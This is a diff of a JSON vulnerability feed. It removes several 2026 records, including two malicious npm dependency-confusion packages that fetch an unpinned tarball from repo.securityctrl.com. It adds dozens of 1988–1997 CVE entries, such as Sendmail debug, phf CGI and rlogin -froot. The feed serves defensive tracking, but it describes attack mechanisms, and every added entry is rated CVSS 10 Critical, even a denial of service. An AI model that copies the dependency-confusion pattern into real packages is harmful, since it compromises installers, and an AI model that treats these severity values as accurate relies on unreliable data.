-      "summary": "package.json at line 11 declares a self-named dependency `intuit-authz` whose source is the bare HTTPS URL `https://repo.securityctrl.com/intuit-authz` instead of a semver range resolved through the npm registry. On `npm install`, npm fetches whatever bytes that URL currently serves and installs them, running any lifecycle scripts contained in the fetched tarball. The reference is unpinned, has no integrity hash, and points at a host unrelated to Intuit's published domains, so the operator of repo.securityctrl.com controls code executed on every installer's machine. The self-named key (`intuit-authz` declaring `intuit-authz` as a dependency) combined with a version number (55.0.0) implausibly high for a package under this name matches the dependency-confusion shape targeting an internal Intuit authorization package.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/intuit-authz/v/55.0.0"
-      ],
-      "vulnerableProducts": [
-        "intuit-authz npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15496",
-      "summary": "package.json declares a single dependency whose key equals the package's own name (`amplitude-experiment`) and whose source is the bare HTTPS URL `https://repo.securityctrl.com/amplitude-experiment` instead of a registry version range. On `npm install`, npm fetches whatever bytes that URL returns and installs them as the resolved dependency, with no version pin and no integrity check, running any lifecycle scripts contained in the fetched tarball. The shipped source of amplitude-experiment@55.0.0 itself is an inert stub, so the manifest line is the entire delivery mechanism. The dependency key matching the package's own name mirrors a dependency-confusion shape against the legitimate `amplitude-experiment` name, and the implausibly high version (55.0.0) is consistent with a resolution-winning squat.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/amplitude-experiment/v/55.0.0"
-      ],
-      "vulnerableProducts": [
-        "amplitude-experiment npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-86996",
-      "summary": "n8n: Agent Workflow Tool Bypasses Sub-Workflow Caller Policy",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": null,
+      "id": "CVE-1999-0095",
+      "summary": "The debug command in Sendmail is enabled, allowing attackers to execute commands as root.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1988-10-01",
       "modified": null,
       "cwe": null,
       "references": [
-        "https://github.com/n8n-io/n8n/security/advisories/GHSA-7hgx-277f-7vmg",
-        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.37.7",
-        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.38.2",
-        "https://github.com/advisories/GHSA-7hgx-277f-7vmg"
+        "http://seclists.org/fulldisclosure/2019/Jun/16",
+        "http://www.openwall.com/lists/oss-security/2019/06/05/4",
+        "http://www.openwall.com/lists/oss-security/2019/06/06/1",
+        "http://www.osvdb.org/195",
+        "http://www.securityfocus.com/bid/1"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0082",
+      "summary": "Security disclosure registered in public vulnerability database.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1988-11-11",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.alw.nih.gov/Security/Docs/admin-guide-to-cracking.101.html",
+        "http://www.alw.nih.gov/Security/Docs/admin-guide-to-cracking.101.html"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1467",
+      "summary": "Vulnerability in rcp on SunOS 4.0.x allows remote attackers from trusted hosts to execute arbitrary commands as root, possibly related to the configuration of the nobody user.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1989-10-26",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.cert.org/advisories/CA-1989-07.html",
+        "http://www.securityfocus.com/bid/5",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/3165",
+        "http://www.cert.org/advisories/CA-1989-07.html",
+        "http://www.securityfocus.com/bid/5"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1193",
+      "summary": "The \"me\" user in NeXT NeXTstep 2.1 and earlier has wheel group privileges, which could allow the me user to use the su command to become root.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1991-05-14",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.cert.org/advisories/CA-1991-06.html",
+        "http://www.securityfocus.com/bid/20",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/581",
+        "http://www.cert.org/advisories/CA-1991-06.html",
+        "http://www.securityfocus.com/bid/20"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0498",
+      "summary": "TFTP is not running in a restricted directory, allowing a remote attacker to access sensitive information such as password files.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1991-09-27",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0498",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0498"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1493",
+      "summary": "Vulnerability in crp in Hewlett Packard Apollo Domain OS SR10 through SR10.3 allows remote attackers to gain root privileges via insecure system calls, (1) pad_$dm_cmd and (2) pad_$def_pfk().",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1991-12-18",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.cert.org/advisories/CA-1991-23.html",
+        "http://www.securityfocus.com/bid/34",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7158",
+        "http://www.cert.org/advisories/CA-1991-23.html",
+        "http://www.securityfocus.com/bid/34"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1032",
+      "summary": "Vulnerability in LAT/Telnet Gateway (lattelnet) on Ultrix 4.1 and 4.2 allows attackers to gain root privileges.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1991-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://ciac.llnl.gov/ciac/bulletins/b-36.shtml",
+        "http://www.cert.org/advisories/CA-1991-11.html",
+        "http://www.securityfocus.com/bid/26",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/584",
+        "http://ciac.llnl.gov/ciac/bulletins/b-36.shtml"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1059",
+      "summary": "Vulnerability in rexec daemon (rexecd) in AT&T TCP/IP 4.0 for various SVR4 systems allows remote attackers to execute arbitrary commands.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1992-02-25",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.cert.org/advisories/CA-1992-04.html",
+        "http://www.iss.net/security_center/static/3159.php",
+        "http://www.securityfocus.com/bid/36",
+        "http://www.cert.org/advisories/CA-1992-04.html",
+        "http://www.iss.net/security_center/static/3159.php"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1119",
+      "summary": "FTP installation script anon.ftp in AIX insecurely configures anonymous FTP, which allows remote attackers to execute arbitrary commands.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1992-04-27",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.cert.org/advisories/CA-1992-09.html",
+        "http://www.securityfocus.com/bid/41",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/3154",
+        "http://www.cert.org/advisories/CA-1992-09.html",
+        "http://www.securityfocus.com/bid/41"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0214",
+      "summary": "Security disclosure registered in public vulnerability database.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1992-07-21",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://www.cve.org/CVERecord?id=CVE-1999-0214",
+        "https://www.cve.org/CVERecord?id=CVE-1999-0214"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0124",
+      "summary": "Vulnerabilities in UMN gopher and gopher+ versions 1.12 and 2.0x allow an intruder to read any files that can be accessed by the gopher daemon.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1993-08-09",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0124",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0124"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1138",
+      "summary": "SCO UNIX System V/386 Release 3.2, and other SCO products, installs the home directories (1) /tmp for the dos user, and (2) /usr/tmp for the asg user, which allows other users to gain access to those accounts since /tmp and /usr/tmp are world-writable.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1993-09-17",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.cert.org/advisories/CA-1993-13.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/546",
+        "http://www.cert.org/advisories/CA-1993-13.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/546"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0113",
+      "summary": "Some implementations of rlogin allow root access if given a -froot parameter.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1994-05-23",
+      "modified": null,
+      "cwe": "CWE-88",
+      "references": [
+        "http://www.securityfocus.com/bid/458",
+        "http://www.securityfocus.com/bid/458"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0232",
+      "summary": "Buffer overflow in NCSA WebServer (version 1.5c) gives remote access.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1995-02-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://www.cve.org/CVERecord?id=CVE-1999-0232",
+        "https://www.cve.org/CVERecord?id=CVE-1999-0232"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0235",
+      "summary": "Buffer overflow in NCSA WebServer (1.4.1 and below) gives remote access.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1995-02-17",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0235",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0235"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0203",
+      "summary": "In Sendmail, attackers can gain root privileges via SMTP by specifying an improper \"mail from\" address and an invalid \"rcpt to\" address that would cause the mail to bounce to a program.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1995-08-17",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0203",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0203"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0073",
+      "summary": "Telnet allows a remote client to specify environment variables including LD_LIBRARY_PATH, allowing an attacker to bypass the normal system libraries and gain root access.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1995-10-13",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0073",
+        "http://www.openwall.com/lists/oss-security/2026/02/24/3",
+        "http://www.openwall.com/lists/oss-security/2026/03/07/3",
+        "http://www.openwall.com/lists/oss-security/2026/03/08/6",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0073"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-77078",
-      "summary": "multer vulnerable to Denial of Service via crafted multipart field names",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": null,
+      "id": "CVE-1999-0099",
+      "summary": "Buffer overflow in syslog utility allows local or remote attackers to gain root privileges.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1995-10-19",
       "modified": null,
       "cwe": null,
       "references": [
-        "https://github.com/expressjs/multer/security/advisories/GHSA-wc9g-mqfw-jrwm",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-77078",
-        "https://github.com/expressjs/multer/commit/87a584e8c8d4da873292635fa1d8c4d78d985b76",
-        "https://cna.openjsf.org/security-advisories.html",
-        "https://github.com/expressjs/multer/releases/tag/v2.3.0"
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0099",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0099"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0241",
+      "summary": "Guessable magic cookies in X Windows allows remote attackers to execute commands, e.g. through xterm.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1995-11-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0241",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0241"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0080",
+      "summary": "Certain configurations of wu-ftp FTP server 2.4 use a _PATH_EXECPATH setting to a directory with dangerous commands, such as /bin, which allows remote authenticated users to gain root access via the \"site exec\" command.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1995-11-30",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://archive.nanog.org/mailinglist/mailarchives/old_archive/1995-11/msg00385.html",
+        "https://archive.nanog.org/mailinglist/mailarchives/old_archive/1995-11/msg00385.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0208",
+      "summary": "rpc.ypupdated (NIS) allows remote users to execute arbitrary commands.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1995-12-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0208",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0208"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1319",
+      "summary": "Vulnerability in object server program in SGI IRIX 5.2 through 6.1 allows remote attackers to gain root privileges in certain configurations.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1996-01-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://patches.sgi.com/support/free/security/advisories/19960101-01-PX",
+        "http://www.iss.net/security_center/static/7430.php",
+        "ftp://patches.sgi.com/support/free/security/advisories/19960101-01-PX",
+        "http://www.iss.net/security_center/static/7430.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0233",
+      "summary": "IIS 1.0 allows users to execute arbitrary commands using .bat or .cmd files.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1996-02-25",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ148188",
+        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ155056",
+        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ148188",
+        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ155056"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0067",
+      "summary": "phf CGI program allows remote command execution through shell metacharacters.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1996-03-20",
+      "modified": null,
+      "cwe": "CWE-78",
+      "references": [
+        "http://www.cert.org/advisories/CA-1996-06.html",
+        "http://www.osvdb.org/136",
+        "http://www.securityfocus.com/bid/629",
+        "http://www.cert.org/advisories/CA-1996-06.html",
+        "http://www.osvdb.org/136"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0509",
+      "summary": "Perl, sh, csh, or other shell interpreters are installed in the cgi-bin directory on a WWW site, which allows remote attackers to execute arbitrary commands.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1996-05-29",
+      "modified": null,
+      "cwe": "CWE-94",
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/146",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/146"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0206",
+      "summary": "MIME buffer overflow in Sendmail 8.8.0 and 8.8.1 gives root access.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1996-10-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0206",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0206"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0246",
+      "summary": "HP Remote Watch allows a remote user to gain root access.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1996-10-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0246",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0246"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0101",
+      "summary": "Buffer overflow in AIX and Solaris \"gethostbyname\" library call allows root access through corrupt DNS host names.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1996-12-10",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://ciac.llnl.gov/ciac/bulletins/h-13.shtml",
+        "http://ciac.llnl.gov/ciac/bulletins/h-13.shtml"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0100",
+      "summary": "Remote access in AIX innd 1.5.1, using control messages.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-01-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0100",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0100"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0204",
+      "summary": "Sendmail 8.6.9 allows remote attackers to execute root commands, using ident.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-01-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0204",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0204"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0535",
+      "summary": "A Windows NT account policy for passwords has inappropriate, security-critical settings, e.g. for password length, password age, or uniqueness.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-01-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0535",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0535"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0048",
+      "summary": "Talkd, when given corrupt DNS information, can be used to execute arbitrary commands with root privileges.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-01-27",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/147",
+        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/147"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0047",
+      "summary": "MIME conversion buffer overflow in sendmail versions 8.8.3 and 8.8.4.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-01-28",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/bid/685",
+        "http://www.securityfocus.com/bid/685"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1160",
+      "summary": "Vulnerability in ftpd/kftpd in HP-UX 10.x and 9.x allows local and possibly remote users to gain root privileges.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-02-02",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://ciac.llnl.gov/ciac/bulletins/h-33.shtml",
+        "http://marc.info/?l=bugtraq&m=87602167420581&w=2",
+        "http://www.iss.net/security_center/static/7437.php",
+        "http://ciac.llnl.gov/ciac/bulletins/h-33.shtml",
+        "http://marc.info/?l=bugtraq&m=87602167420581&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1299",
+      "summary": "rcp on various Linux systems including Red Hat 4.0 allows a \"nobody\" user or other user with UID of 65535 to overwrite arbitrary files, since 65535 is interpreted as -1 by chown and other system calls, which causes the calls to fail to modify the ownership of the file.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-02-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=87602167420509&w=2",
+        "http://marc.info/?l=bugtraq&m=87602167420509&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0046",
+      "summary": "Buffer overflow of rlogin program using TERM environmental variable.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-02-06",
+      "modified": null,
+      "cwe": "CWE-120",
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0046",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0046"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0165",
+      "summary": "NFS cache poisoning.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-03-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://www.cve.org/CVERecord?id=CVE-1999-0165",
+        "https://www.cve.org/CVERecord?id=CVE-1999-0165"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0042",
+      "summary": "Buffer overflow in University of Washington's implementation of IMAP and POP servers.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-04-07",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0042",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0042"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0799",
+      "summary": "Buffer overflow in bootpd 2.4.3 and earlier via a long boot file location.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-06-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0799",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0799"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0169",
+      "summary": "NFS allows attackers to read and write any file on the system by specifying a false UID.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-07-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0169",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0169"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0250",
+      "summary": "Denial of service in Qmail through long SMTP commands.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-07-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://cr.yp.to/qmail/venema.html",
+        "http://marc.info/?l=bugtraq&m=87602558319024&w=2",
+        "http://www.ornl.gov/its/archives/mailing-lists/qmail/1997/06/threads.html",
+        "http://cr.yp.to/qmail/venema.html",
+        "http://marc.info/?l=bugtraq&m=87602558319024&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0526",
+      "summary": "An X server's access control is disabled (e.g. through an \"xhost +\" command) and allows anyone to connect to the server.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-07-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.kb.cert.org/vuls/id/704969",
+        "http://www.kb.cert.org/vuls/id/704969"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0238",
+      "summary": "php.cgi allows attackers to read any file on the system.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-08-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0238",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0238"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0667",
+      "summary": "The ARP protocol allows any host to spoof ARP replies and poison the ARP cache to conduct IP address spoofing or a denial of service.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-09-19",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://marc.info/?l=bugtraq&m=87602880019797&w=2",
+        "https://marc.info/?l=bugtraq&m=87602880019797&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1125",
+      "summary": "Oracle Webserver 2.1 and earlier runs setuid root, but the configuration file is owned by the oracle account, which allows any local or remote attacker who obtains access to the oracle account to gain privileges or modify arbitrary files by modifying the configuration file.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-09-19",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=87602880019796&w=2",
+        "http://marc.info/?l=bugtraq&m=87602880019796&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0182",
+      "summary": "Samba has a buffer overflow which allows a remote attacker to obtain root access by specifying a long password.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-09-30",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.ciac.org/ciac/bulletins/h-110.shtml",
+        "http://www.ciac.org/ciac/bulletins/h-110.shtml"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0192",
+      "summary": "Buffer overflow in telnet daemon tgetent routing allows remote attackers to gain root access via the TERMCAP environmental variable.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-10-18",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0192",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0192"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0097",
+      "summary": "The AIX FTP client can be forced to execute commands from a malicious server through shell metacharacters (e.g. a pipe character).",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1997-10-29",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0097",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0097"
       ],
       "vulnerableProducts": [],
       "isExploited": false
